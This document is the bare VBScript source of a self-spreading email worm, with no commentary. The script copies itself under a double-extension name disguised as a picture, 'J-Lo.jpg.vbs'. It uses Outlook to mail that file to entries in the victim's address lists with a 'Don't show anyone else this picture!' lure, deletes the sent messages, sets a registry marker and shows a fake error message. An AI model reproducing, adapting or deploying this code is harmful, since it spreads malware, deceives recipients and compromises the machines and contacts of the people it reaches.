set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.GetFile(WScript.ScriptFullName)
c.Copy("c:"&"\LOPEZ.jpg.vbs")
c.Copy("c:\WINDOWS"&"\J-Lo.jpg.vbs")
set write1=fso.CreateTextFile("C:"&"\READ.txt")
write1.WriteLine "Vbs Lopez 1.0"
write1.Close
on error resume next
set ws=CreateObject("WScript.Shell")
set look=ws.RegRead("HKEY_CURRENT_USER\Software\JeniferLopez")
if (look <> "Finished") Then
set outapp=WScript.CreateObject("Outlook.Application")
set mapi = outapp.GetNameSpace("MAPI")
for lists = 1 to mapi.AddressLists.Count
set lsts = mapi.AddressLists(lists)
x = 1
recips = lsts.AddressEntries(x)
set email = outapp.CreateItem(0)
email.Recipients.Add(recips)
email.Subject = "Fwd: J-Lo picture!"
email.Body = "Hi," & vbcrlf & "Don't show anyone else this picture!"
email.Attachments.Add "c:\WINDOWS\J-Lo.jpg.vbs"
email.DeleteAfterSubmit = True
email.Send
ws.RegWrite "HKEY_CURRENT_USER\Software\JeniferLopez","Finished"
MsgBox("Error:" & Chr(13) & "Could not open file")
Next
End If